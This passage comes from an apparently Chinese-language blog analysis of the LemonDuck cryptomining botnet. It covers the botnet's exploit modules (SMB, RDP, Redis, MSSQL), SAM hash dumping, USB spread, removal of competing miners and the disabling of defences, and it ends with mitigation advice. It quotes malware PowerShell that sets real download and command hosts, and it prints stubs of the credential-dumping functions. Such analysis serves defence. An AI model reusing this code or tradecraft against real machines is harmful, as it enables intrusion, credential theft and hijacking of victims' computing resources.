gmd5([IO.File]::ReadAllBytes(&#x22;$env:tmp\$ifbin&#x22;)) } catch {}try { $lmmd5 = gmd5([IO.File]::ReadAllBytes(&#x22;$env:tmp\$mbin&#x22;)) } catch {}try { $lkrmd5 = gmd5([IO.File]::ReadAllBytes(&#x22;$env:tmp\$krbin&#x22;)) } catch {}$down_url = &#x22;http://d.ackng.com&#x22;if (!$url) { $url = &#x22;http://t.amynx.com&#x22; }$core_url = $url.split(&#x22;/&#x22;)[0..2] -join &#x22;/&#x22;"><div></div></button></div></figure></div>
<p><strong>标识特征</strong>：下载时携带UALemon-Duck-标识，可作为检测特征。</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash"><code><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$webclient</span><span style="--0:#DBD7CAEE;--1:#393A34">.Headers.add(</span><span style="--0:#80A665;--1:#59873A">"User-Agent"</span><span style="--0:#80A665;--1:#59873A">,</span><span style="--0:#80A665;--1:#59873A">"Lemon-Duck-"</span><span style="--0:#80A665;--1:#59873A">+$Lemon_Duck.replace(</span><span style="--0:#80A665;--1:#59873A">' \ '</span><span style="--0:#80A665;--1:#59873A">,</span><span style="--0:#80A665;--1:#59873A">' - '</span><span style="--0:#DBD7CAEE;--1:#393A34">))</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$webclient.Headers.add(&#x22;User-Agent&#x22;,&#x22;Lemon-Duck-&#x22;+$Lemon_Duck.replace(&#x27; \ &#x27;,&#x27; - &#x27;))"><div></div></button></div></figure></div>
<h3 id="功能模块层">功能模块层<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 功能模块层" data-pagefind-ignore="" href="#功能模块层">#</a></h3>
<p>由 a.jsp 下载的各类 bin 文件组成，是攻击的具体落地环节。</p>
<h4 id="ifbin内网渗透与传播模块"><code>if.bin</code>：内网渗透与传播模块<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to if.bin：内网渗透与传播模块" data-pagefind-ignore="" href="#ifbin内网渗透与传播模块">#</a></h4>
<p><code>if.bin</code>是一个功能完整、针对性强的内网渗透与横向传播模块，整合了漏洞利用、凭证窃取、多渠道传播等核心能力，主要面向 Windows 内网环境，技术复杂度较高。</p>
<h5 id="一漏洞利用总览">一、漏洞利用总览<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 一、漏洞利用总览" data-pagefind-ignore="" href="#一漏洞利用总览">#</a></h5>
<p>if.bin 会先标识受害机漏洞，再从 <a href="http://t%5B.%5Damynx%5B.%5Dcom">http://t[.]amynx[.]com</a> 下载对应漏洞利用脚本，全量漏洞清单如下：</p>
<div>

















































<table><thead><tr><th align="left">漏洞类型</th><th>目的</th><th align="left">特征</th></tr></thead><tbody><tr><td align="left">IPC$ 共享匿名访问漏洞 + Windows Defender 绕过（7p.php）</td><td>横向移动入口 + 本地权限维持</td><td align="left">匿名连接 IPC$、禁用 Defender、分发 USB 感染脚本</td></tr><tr><td align="left">SMBv1/SMBv2 权限提升漏洞（ipc.jsp/ipco.jsp）</td><td>权限提升（SMBGhost 变种）</td><td align="left">利用 Trans2/NT_TRANS 命令堆溢出，注入恶意数据获取系统权限</td></tr><tr><td align="left">MSSQL 漏洞（ms.jsp/mso.jsp）</td><td>数据库服务器横向移动 + 窃取数据库凭证</td><td align="left">弱口令登录 1433 端口，启用 xp_cmdshell 执行木马</td></tr><tr><td align="left">远程桌面漏洞（rdp.jsp/rdpo.jsp）</td><td>RDP 暴力破解 + BlueKeep 远程代码执行</td><td align="left">暴力破解账号、绕过 NLA 限制，利用 msrdp.dll 堆溢出注入 shellcode</td></tr><tr><td align="left">SMB 协议进阶漏洞（smgh.jsp/smgho.jsp）</td><td>SMB 权限提升（CVE-2021-36934 变种）</td><td align="left">构造恶意 SMB1_TRANS2_EXPLOIT_PACKET，覆盖非分页池内存</td></tr><tr><td align="left">Redis 数据库漏洞（rds /rdso）</td><td>Redis 未授权访问 + 权限提升</td><td align="left">6379 端口未授权，写入 crontab / 注册表植入木马</td></tr><tr><td align="left">SSH 协议漏洞（ssh /ssho）</td><td>SSH 弱口令暴力破解 + 权限提升</td><td align="left">爆破 22 端口账号，适配 OpenSSH 9.0 + 密钥认证限制</td></tr><tr><td align="left">Hadoop YARN 漏洞（yarn /yarno）</td><td>YARN ResourceManager 未授权访问</td><td align="left">8088 端口未授权，提交恶意 Application 执行命令</td></tr></tbody></table></div>
<h5 id="二漏洞解析">二、漏洞解析<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 二、漏洞解析" data-pagefind-ignore="" href="#二漏洞解析">#</a></h5>
<h6 id="smb-协议漏洞">SMB 协议漏洞<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to SMB 协议漏洞" data-pagefind-ignore="" href="#smb-协议漏洞">#</a></h6>
<p>SMB 是 <code>if.bin</code> 横向渗透的核心载体，整合了 SMBv1/SMBv2 协议多个高危漏洞（CVE-2020-0796、CVE-2021-36934 等），专门针对无补丁的 Windows 7/8/2008/2012 系统：</p>
<ul>
<li>核心函数：<code>smb1_anonymous_connect_ipc</code>（匿名连接目标主机 IPC$ 共享）、<code>eb7/eb8</code>（构造恶意 SMB 数据包触发缓冲区溢出）；</li>
</ul>
<p><img alt="image-20260213184921229" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 572px) 572px, 100vw"  data-astro-image="constrained" width="572" height="273" src="/mywebsite/_astro/20260221222610405_Z21xxnz.webp" srcset="/mywebsite/_astro/20260221222610405_Z21xxnz.webp 572w"></p>
<p><img alt="image-20260214000205631" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 583px) 583px, 100vw"  data-astro-image="constrained" width="583" height="465" src="/mywebsite/_astro/20260221222612123_1J2xwM.webp" srcset="/mywebsite/_astro/20260221222612123_1J2xwM.webp 583w"></p>
<ul>
<li>攻击逻辑：
<ol>
<li>向目标主机 445 端口发送恶意 SMB 数据包；</li>
<li>利用堆溢出 / 内存破坏漏洞覆盖非分页池内存，注入 fake_recv_struct 伪造接收结构；</li>
<li>获取系统权限后注入 shellcode，执行禁用杀软、部署木马等命令；</li>
</ol>
</li>
</ul>
<h6 id="rdp-漏洞">RDP 漏洞<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to RDP 漏洞" data-pagefind-ignore="" href="#rdp-漏洞">#</a></h6>
<p>围绕RDP（3389 端口）协议的攻击与控制权获取，是横向移动的核心模块，包含 RDP 暴力破解、NLA 绕过、远程命令执行三大核心能力。</p>
<p><strong><code>BRUTE</code>类</strong>：RDP 暴力破解核心</p>
<ul>
<li>支持 NLA 模式适配（<code>/sec:nla</code>参数），通过<code>/cert-ignore</code>绕过证书验证，实现 NLA 绕过；</li>
</ul>
<p><img alt="image-20260214000839851" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 1022px) 1022px, 100vw"  data-astro-image="constrained" width="1022" height="438" src="/mywebsite/_astro/20260221222614938_ZjTHLA.webp" srcset="/mywebsite/_astro/20260221222614938_Z1ULi3e.webp 640w, /mywebsite/_astro/20260221222614938_Z17qFa1.webp 750w, /mywebsite/_astro/20260221222614938_Z1W2MJl.webp 828w, /mywebsite/_astro/20260221222614938_ZjTHLA.webp 1022w"></p>
<ul>
<li>低频率探测策略（10 秒超时 + 1 秒循环检测），规避日志告警；</li>
</ul>
<p><img alt="image-20260214000902366" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 292px) 292px, 100vw"  data-astro-image="constrained" width="292" height="158" src="/mywebsite/_astro/20260221222617122_3c4L7.webp" srcset="/mywebsite/_astro/20260221222617122_3c4L7.webp 292w"></p>
<ul>
<li>解析 RDP 客户端输出（如<code>LogonInfoV2</code>标识登录成功、<code>Server rdp encryption method</code>标识服务存活），判断攻击结果。</li>
</ul>
<p><img alt="image-20260214000943093" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 615px) 615px, 100vw"  data-astro-image="constrained" width="615" height="368" src="/mywebsite/_astro/20260221222619040_2dU7Pd.webp" srcset="/mywebsite/_astro/20260221222619040_2dU7Pd.webp 615w"></p>
<h6 id="redis-漏洞">Redis 漏洞<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to Redis 漏洞" data-pagefind-ignore="" href="#redis-漏洞">#</a></h6>
<p>利用未授权访问后的 “写文件 + 权限提升” ：</p>
<ul>
<li>核心函数：<code>redisexec</code>（利用 Redis 漏洞实现 Linux 端渗透）、<code>Enable-SeDebugPrivilege</code>（启用高权限调试权限）、<code>LHSDGUKsdHF</code>（反射加载 PE 文件，提权工具）；</li>
</ul>
<p><img alt="image-20260214001057178" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 575px) 575px, 100vw"  data-astro-image="constrained" width="575" height="711" src="/mywebsite/_astro/20260221222621163_2lDEqO.webp" srcset="/mywebsite/_astro/20260221222621163_2lDEqO.webp 575w"></p>
<h5 id="三核心能力">三、核心能力<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 三、核心能力" data-pagefind-ignore="" href="#三核心能力">#</a></h5>
<h6 id="凭据窃取模块窃取核心敏感信息">凭据窃取模块：窃取核心敏感信息<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 凭据窃取模块：窃取核心敏感信息" data-pagefind-ignore="" href="#凭据窃取模块窃取核心敏感信息">#</a></h6>
<ul>
<li>
<p>Windows 账号哈希窃取：通过geth函数读取 SAM 注册表、计算 BootKey、RC4 解密 NTLM/LM 哈希，直接获取管理员账号凭据：</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash"><code><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0"># 核心流程：读取SAM注册表→计算BootKey→解密Hash→输出账号密码哈希</span></div></div><div class="ec-line"><div class="code"><span style="--0:#CB7676;--1:#AB5959">function</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">geth</span></div></div><div class="ec-line"><div class="code"><span style="--0:#CB7676;--1:#AB5959">function</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">NewRC4</span><span style="--0:#666666;--1:#999999">([</span><span style="--0:#DBD7CAEE;--1:#393A34">byte</span><span style="--0:#666666;--1:#999999">[]]</span><span style="--0:#BD976A;--1:#B07D48">$key</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span style="--0:#CB7676;--1:#AB5959">function</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">Get-BootKey</span></div></div><div class="ec-line"><div class="code"><span style="--0:#CB7676;--1:#AB5959">function</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">Get-HBootKey</span></div></div><div class="ec-line"><div class="code"><span style="--0:#CB7676;--1:#AB5959">function</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">DumpHashes</span><span style="--0:#DBD7CAEE;--1:#393A34"> # 输出NTLM/LM哈希（可用于Pass-the-Hash横向移动）</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="function gethfunction NewRC4([byte[]]$key)function Get-BootKeyfunction Get-HBootKeyfunction DumpHashes # 输出NTLM/LM哈希（可用于Pass-the-Hash横向移动）"><div></div></button></div></figure></div>
</li>
<li>
<p>RDP 暴力破解：通过<code>RDP.BRUTE</code>类（C# 嵌入代码）暴力破解远程桌面账号，支持验证登录状态和加密方式；</p>
</li>
<li>
<p>其他信息窃取：收集主机名、UUID、MAC 地址、系统版本、内存大小等全量指纹，用于精准攻击。</p>
</li>
</ul>
<h6 id="横向移动模块扩散感染内网主机">横向移动模块：扩散感染内网主机<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 横向移动模块：扩散感染内网主机" data-pagefind-ignore="" href="#横向移动模块扩散感染内网主机">#</a></h6>
<ul>
<li>SMB 协议横向移动：通过<code>Invoke-SE</code>函数实现 SMB 远程命令执行，支持 NTLM 哈希认证（Pass-the-Hash），无需明文密码即可控制内网其他主机；</li>
<li>RDP 横向移动：暴力破解成功后，通过<code>CMD.runCmd</code>函数远程执行命令，控制目标主机；</li>
<li>多协议适配：支持 SSH、Redis、MSSQL 等协议的远程命令执行，覆盖内网常见服务。</li>
</ul>
<h6 id="传播扩散模块usb-设备自动感染">传播扩散模块：USB 设备自动感染<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 传播扩散模块：USB 设备自动感染" data-pagefind-ignore="" href="#传播扩散模块usb-设备自动感染">#</a></h6>
<p>通过<code>USB.USBLNK</code>类（C# 嵌入代码）实现USB 移动设备的自动化感染与木马传播，是扩大攻击范围的关键模块，通过创建恶意快捷方式（LNK）、JS 脚本，感染连接的 USB 设备，实现 “插上即感染”。</p>
<ul>
<li>核心动作：
<ol>
<li>检测插入的 USB 设备（支持 FAT32/NTFS 格式）；</li>
<li>创建隐藏目录UTFsync，恶意 LNK 快捷方式（<code>blue3.bin.lnk/blue6.bin.lnk</code>）和 JS 脚本（<code>readme.js</code>）；</li>
<li>LNK 文件指向 Base64 编码的恶意程序，JS 脚本调用WScript.Shell执行恶意命令；</li>
<li>记录已感染设备到黑名单，避免重复感染。</li>
</ol>
</li>
</ul>
<h4 id="krbin竞品清理与防御削弱"><code>kr.bin</code>：竞品清理与防御削弱<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to kr.bin：竞品清理与防御削弱" data-pagefind-ignore="" href="#krbin竞品清理与防御削弱">#</a></h4>
<h5 id="一竞品清理">一、竞品清理<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 一、竞品清理" data-pagefind-ignore="" href="#一竞品清理">#</a></h5>
<p>清除目标主机上所有其他挖矿程序，避免算力被瓜分，从<strong>进程、自启动项、网络连接</strong>三个核心维度实现对竞品挖矿程序的彻底清理，覆盖挖矿程序的运行、持久化、网络通信全链路，让其他挖矿程序无法启动、无法持久化、无法连接挖矿代理。</p>
<h6 id="进程层面强制终止--深度暂停阻断竞品运行">进程层面：强制终止 + 深度暂停，阻断竞品运行<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 进程层面：强制终止 + 深度暂停，阻断竞品运行" data-pagefind-ignore="" href="#进程层面强制终止--深度暂停阻断竞品运行">#</a></h6>
<p>脚本在<code>Killer</code>核心函数中，通过<strong>预设挖矿进程特征库 + 精准进程暂停</strong>，实现对其他挖矿程序进程的双重打击，不仅直接终止运行中的竞品，还能对漏网的挖矿进程做深度暂停，防止其重启。</p>
<p><strong>强制终止主流挖矿进程</strong>：预设<code>$Miner</code>进程列表，包含近 60 个挖矿程序相关特征名，覆盖<strong>门罗币挖矿（XMR*、xmrig*、minerd）</strong>、挖矿代理（MinerGate）、其他币种挖矿（Carbon）等主流挖矿程序，同时包含挖矿程序常见的伪装进程名（svchosti、explores、conhoste 等，仿冒系统进程），通过<code>Stop-Process -Force</code>强制终止，无任何容错空间。</p>
<p><img alt="image-20260213220121118" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 607px) 607px, 100vw"  data-astro-image="constrained" width="607" height="64" src="/mywebsite/_astro/20260221222625674_Z1FOrlI.webp" srcset="/mywebsite/_astro/20260221222625674_Z1FOrlI.webp 607w"></p>
<p><strong>深度暂停挖矿代理关联进程</strong>：对检测到的挖矿代理外网连接关联进程，通过<code>ProcessSuspend</code>函数调用<code>kernel32.dll</code>底层 API 实现<strong>进程调试暂停</strong>，该方式比原生终止更彻底，且需要<code>SeDebugPrivilege</code>高级权限才能解除，能有效防止其他挖矿程序的进程自重启，从进程运行层面实现算力独占。</p>
<p><img alt="image-20260213220702841" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 639px) 639px, 100vw"  data-astro-image="constrained" width="639" height="272" src="/mywebsite/_astro/20260221222627473_Z2laUwi.webp" srcset="/mywebsite/_astro/20260221222627473_Z2laUwi.webp 639w"></p>
<h6 id="持久化层面删除竞品自启动项杜绝挖矿程序重启">持久化层面：删除竞品自启动项，杜绝挖矿程序重启<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 持久化层面：删除竞品自启动项，杜绝挖矿程序重启" data-pagefind-ignore="" href="#持久化层面删除竞品自启动项杜绝挖矿程序重启">#</a></h6>
<p>挖矿程序通常会通过<strong>系统服务、计划任务</strong>实现持久化，脚本针对性清理竞品挖矿程序的自启动配置，让其即使被手动启动，也无法在主机重启后自动运行，从根源上消除竞品复现的可能。</p>
<p><strong>禁用并删除挖矿相关服务</strong>：预设<code>$SrvName</code>恶意服务列表，包含柠檬鸭识别的其他挖矿程序创建的伪装服务（如 xWinWpdSrv、SVSHost、WinHelp32/64）、挖矿程序的持久化服务（如 sysmgt、WebServers），通过<code>sc.exe</code>执行<strong>禁用→停止→删除</strong>三步操作，彻底清除挖矿服务自启动项。</p>
<p><img alt="image-20260213221001585" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 818px) 818px, 100vw"  data-astro-image="constrained" width="818" height="368" src="/mywebsite/_astro/20260221222629779_1haC5O.webp" srcset="/mywebsite/_astro/20260221222629779_Z1I5zDV.webp 640w, /mywebsite/_astro/20260221222629779_Z1VKuHd.webp 750w, /mywebsite/_astro/20260221222629779_1haC5O.webp 818w"></p>
<p><strong>强制删除挖矿相关计划任务</strong>：预设<code>$TaskName</code>计划任务列表，包含其他挖矿程序的定时启动任务（如 my1、Mysa 系列、gm/ngm）、挖矿程序伪装的系统任务（如 Windows_Update、Update_windows），通过<code>SchTasks.exe /Delete /F</code>强制删除，无提示且不可恢复，切断挖矿程序的定时持久化路径。</p>
<p><img alt="image-20260213221114296" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 952px) 952px, 100vw"  data-astro-image="constrained" width="952" height="272" src="/mywebsite/_astro/20260221222631335_Z1HkTKY.webp" srcset="/mywebsite/_astro/20260221222631335_ZyPrL9.webp 640w, /mywebsite/_astro/20260221222631335_Zjr2sh.webp 750w, /mywebsite/_astro/20260221222631335_7u2zs.webp 828w, /mywebsite/_astro/20260221222631335_Z1HkTKY.webp 952w"></p>
<h6 id="网络层面阻断竞品挖矿代理连接">网络层面：阻断竞品挖矿代理连接<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 网络层面：阻断竞品挖矿代理连接" data-pagefind-ignore="" href="#网络层面阻断竞品挖矿代理连接">#</a></h6>
<p>挖矿程序的核心需求是连接挖矿代理 / 矿池获取挖矿任务，脚本从<strong>IP 封禁 + 代理检测</strong>两个维度，阻断其他挖矿程序与外网挖矿代理的通信，让竞品即使进程未被清理，也无法获取挖矿任务，失去挖矿价值。</p>
<p><strong>精准检测挖矿代理连接</strong>：通过<code>isminerproxy</code>/<code>isminerproxys</code>函数，针对 XMRig 等主流挖矿程序的<strong>JSONRPC 协议特征</strong>，检测目标主机与外网的挖矿代理连接，覆盖<strong>明文 + TLS 加密</strong>两种挖矿代理通信方式，无死角识别竞品的挖矿网络连接。</p>
<p><img alt="image-20260213221406300" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 707px) 707px, 100vw"  data-astro-image="constrained" width="707" height="462" src="/mywebsite/_astro/20260221222633167_Z1Wdu5Y.webp" srcset="/mywebsite/_astro/20260221222633167_kK91u.webp 640w, /mywebsite/_astro/20260221222633167_Z1Wdu5Y.webp 707w"></p>
<p><strong>永久封禁挖矿代理 IP</strong>：对检测到的挖矿代理 IP，通过<code>banIp</code>函数执行<code>route add $ip 0.0.0.0 IF 1 -p</code>添加<strong>永久静态路由</strong>，将挖矿代理 IP 指向空地址，实现本地网络层面的永久阻断，且该路由规则默认对所有网络连接生效，其他挖矿程序无法绕开。</p>
<p><img alt="image-20260213221453774" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 276px) 276px, 100vw"  data-astro-image="constrained" width="276" height="114" src="/mywebsite/_astro/20260221222635339_ZJBjNH.webp" srcset="/mywebsite/_astro/20260221222635339_ZJBjNH.webp 276w"></p>
<p><strong>缓存已处置 IP，避免重复操作</strong>：通过全局变量<code>$ipdealcache</code>缓存已封禁的挖矿代理 IP: 端口，后续循环检测中直接执行进程暂停 + IP 封禁，提升清理效率，确保挖矿代理连接被持续阻断。</p>
<p><img alt="image-20260213221601019" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 356px) 356px, 100vw"  data-astro-image="constrained" width="356" height="190" src="/mywebsite/_astro/20260221222637070_ZvTzhK.webp" srcset="/mywebsite/_astro/20260221222637070_ZvTzhK.webp 356w"></p>
<h5 id="二防御削弱">二、防御削弱<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 二、防御削弱" data-pagefind-ignore="" href="#二防御削弱">#</a></h5>
<p>通过<strong>禁用系统防护工具、删除监控组件、破坏系统更新、干扰人工操作</strong>等方式，削弱目标主机的防御与监控能力。</p>
<h6 id="禁用系统原生防护与监控工具">禁用系统原生防护与监控工具<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 禁用系统原生防护与监控工具" data-pagefind-ignore="" href="#禁用系统原生防护与监控工具">#</a></h6>
<p>脚本针对性打击 Windows 系统原生的防护、监控组件，让系统失去基础的恶意行为检测能力，无法识别柠檬鸭的挖矿行为。</p>
<ol>
<li><strong>终止系统杀毒 / 防护进程</strong>：在<code>$Miner</code>进程列表中包含<code>WindowsDefender*</code>，直接强制终止 Windows Defender 杀毒软件进程，禁用系统原生的恶意程序检测功能，让柠檬鸭的挖矿进程、恶意文件无法被查杀。</li>
<li><strong>删除系统监控相关任务 / 服务</strong>：在<code>$SrvName</code>/<code>$TaskName</code>中包含<code>Microsoft Telemetry</code>（微软遥测服务，负责系统行为监控与上报）、<code>System Log Security Check</code>（系统日志安全检测任务），通过禁用服务、删除任务的方式，切断系统的行为监控与日志上报，柠檬鸭的挖矿操作不会被系统日志记录，管理员无法通过系统日志发现异常。</li>
</ol>
<h6 id="打击云服务--第三方监控工具">打击云服务 / 第三方监控工具<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 打击云服务 / 第三方监控工具" data-pagefind-ignore="" href="#打击云服务--第三方监控工具">#</a></h6>
<p>针对企业主机常用的<strong>云服务监控、第三方安全工具</strong>，脚本通过清理其相关服务、进程，让远程监控端无法获取目标主机的状态，实现 “离线式” 挖矿。</p>
<ol>
<li><strong>清理云监控相关服务</strong>：<code>$SrvName</code>中的<code>WebServers</code>、<code>ExpressVNService</code>为云服务监控常用的 web 服务、代理服务，删除此类服务会导致云监控端无法通过网络连接目标主机，无法获取主机的进程、网络、资源占用等监控数据，柠檬鸭的挖矿算力占用无法被远程发现。</li>
<li><strong>打击第三方安全软件</strong>：<code>$SrvName</code>中的<code>360rTys</code>指向 360 等第三方安全软件的相关服务，通过禁用删除让第三方安全软件失效，无法对柠檬鸭的挖矿行为做实时检测与拦截。</li>
</ol>
<h6 id="破坏系统更新与安全策略削弱主机防御能力">破坏系统更新与安全策略，削弱主机防御能力<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 破坏系统更新与安全策略，削弱主机防御能力" data-pagefind-ignore="" href="#破坏系统更新与安全策略削弱主机防御能力">#</a></h6>
<p>脚本通过禁用系统更新、破坏系统安全策略，让目标主机无法修复系统漏洞、无法配置安全规则，不仅让柠檬鸭能通过漏洞持续持久化，也让管理员无法通过系统层面的配置防御挖矿行为。</p>
<ol>
<li><strong>禁用系统更新相关组件</strong>：在<code>$SrvName</code>/<code>$TaskName</code>中多次出现<code>Windows_Update</code>、<code>Update_windows</code>、<code>WindowsUpdate1-3</code>等系统更新相关名称，即使是系统原生的更新服务 / 任务，也会被脚本禁用删除，目标主机无法下载并安装系统漏洞补丁，柠檬鸭可利用已知系统漏洞持续控制主机，且管理员无法通过更新系统封堵挖矿木马的入侵路径。</li>
<li><strong>破坏系统安全策略相关服务</strong>：<code>$SrvName</code>中的<code>IPSECS</code>（IP 安全策略服务）是 Windows 系统实现 IP 访问控制、安全加密的核心服务，禁用该服务后，管理员无法通过配置 IP 安全策略封禁挖矿代理 IP，也无法限制进程的网络通信，从系统安全策略层面瓦解防御。</li>
</ol>
<h6 id="干扰人工管理操作降低被手动清理的概率">干扰人工管理操作，降低被手动清理的概率<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 干扰人工管理操作，降低被手动清理的概率" data-pagefind-ignore="" href="#干扰人工管理操作降低被手动清理的概率">#</a></h6>
<p>脚本通过<strong>后台启动任务管理器、清理系统管理工具相关进程</strong>的方式，干扰管理员的人工主机管理操作，让管理员无法快速发现并手动终止柠檬鸭的挖矿进程。</p>
<p><strong>后台启动任务管理器，干扰进程查看</strong>：脚本在<code>Killer</code>函数中检测任务管理器（TaskMgr）是否运行，若未运行则通过<code>Start-Process -WindowStyle hidden</code><strong>后台启动</strong>，管理员手动打开任务管理器时会出现界面异常，无法正常查看主机的进程列表，也就无法发现柠檬鸭的挖矿进程。</p>
<p><img alt="image-20260213222306764" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 473px) 473px, 100vw"  data-astro-image="constrained" width="473" height="115" src="/mywebsite/_astro/20260221222640991_Z1g3QUx.webp" srcset="/mywebsite/_astro/20260221222640991_Z1g3QUx.webp 473w"></p>
<p><strong>清理系统管理工具相关进程</strong>：<code>$Miner</code>进程列表中包含<code>taskmgr1</code>（伪装 / 异常的任务管理器进程）、<code>msinfo</code>（系统信息工具进程），强制终止此类进程，让管理员无法通过系统原生工具查看主机的进程、资源、网络等关键信息，无法手动定位并清理柠檬鸭的挖矿组件。</p>
<h2 id="处置建议">处置建议<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 处置建议" data-pagefind-ignore="" href="#处置建议">#</a></h2>
<ol>
<li>
<p><strong>补丁管理</strong>：重点修复 MS17-010 及 CVE-2020-0796。</p>
</li>
<li>
<p><strong>端口封禁</strong>：严格限制内网 135、139、445 及 3389 端口的跨网段通信。</p>
</li>
<li>
<p><strong>弱口令清理</strong>：强制修改 SSH、Redis 及 SQL Server 的默认/弱口令。</p>
</li>
<li>
<p><strong>监测</strong>：监控 PowerShell 异常执行记录（尤其是带有 Base64 编码的指令流）及 WMI 事件订阅的变化。</p>
</li>
</ol>
<p><strong>参考资料</strong></p>
<p><a href="https://www.freebuf.com/articles/network/360231.html">典型挖矿家族系列分析四丨LemonDuck挖矿僵尸网络 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&#x26;tid=1346660&#x26;highlight=%C4%FB%C3%CA%D1%BC">柠檬鸭（Lemon Duck）样本分析 - 吾爱破解 - 52pojie.cn</a></p>
<p><a href="https://www.freebuf.com/articles/system/253431.html">永恒之蓝木马下载器再更新，云上主机成为新目标 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://www.52pojie.cn/thread-1157955-1-1.html">蠕虫病毒“柠檬鸭”持续扩散 多种暴破方式攻击用户电脑 - 吾爱破解 - 52pojie.cn</a></p>
<p><a href="https://www.52pojie.cn/thread-1543561-1-1.html">挖矿病毒分析之powershell解密小技巧 - 吾爱破解 - 52pojie.cn</a></p>  </article>   <image-viewer data-selector="article" data-options="{&#34;title&#34;:0,&#34;navbar&#34;:0}"></image-viewer> <script type="module" src="/mywebsite/_astro/ImageViewer.astro_astro_type_script_index_0_lang.BbQHAm9u.js"></script>  <!-- Share --> <footer class="slide-enter animate-delay-1000! prose mx-auto mt-8 print:hidden"> <span class="font-mono op-50">&gt; </span> <span class="op-50">share on</span>  <a class="op-60 no-underline hover:op-100 op-50!" href="https://twitter.com/intent/tweet?text=Reading%20%40noknoku07_nok's%20https%3A%2F%2Fnickyl07.github.io%2Fmywebsite%2Fblog%2F%25E6%259F%25A0%25E6%25AA%25AC%25E9%25B8%25ADlemon-duck%25E5%2583%25B5%25E5%25B0%25B8%25E7%25BD%2591%25E7%25BB%259C%25E6%25B7%25B1%25E5%25BA%25A6%25E6%258A%2580%25E6%259C%25AF%25E5%2588%2586%25E6%259E%2590%25E6%258A%25A5%25E5%2591%258A%2F%0A%0AI%20think..." title="Tweet this post" aria-label="Tweet this post">  twitter</a>  <br> <span class="font-mono op-50">&gt; </span> <a class="op-60 no-underline hover:op-100 font-mono op-50!" href="/mywebsite/blog/">  cd ..</a> </footer> <!-- Comments --> <div class="prose mx-auto mt-8"> <hr> <div class="giscus"></div> <script type="module">const e={giscus:[!0,{"data-repo":"lin-stephanie/astro-antfustyle-theme","data-repo-id":"R_kgDOLylKbA","data-category":"Giscus","data-category-id":"DIC_kwDOLylKbM4Cpugn","data-mapping":"title","data-strict":"0","data-reactions-enabled":"1","data-emit-metadata":"0","data-input-position":"bottom","data-lang":"zh"}]},a=`${location.origin}/giscus/light.css`,i=`${location.origin}/giscus/dark.css`,o=Array.isArray(e.giscus)&&e.giscus[1],s=document.createElement("script");Object.entries({...o,id:"giscus-script",src:"https://giscus.app/client.js",crossOrigin:"anonymous",async:""}).forEach(([t,c])=>{s.setAttribute(t,c)});const r=()=>{document.querySelectorAll("iframe.giscus-frame").forEach(t=>t.remove()),document.querySelectorAll("script#giscus-script").forEach(t=>t.remove())},n=()=>{if(!document.querySelector(".giscus"))return;const t=s.cloneNode(!0);t.setAttribute("data-theme",document.documentElement.classList.contains("dark")?i:a),document.body.appendChild(t)};document.addEventListener("astro:before-swap",r);document.addEventListener("astro:page-load",n);</script> </div> </main> <!-- Footer --> <footer class="slide-enter animate-delay-1600! px-7 mt-auto mb-8"> <div class="prose mx-auto op-50"> <div class="flex 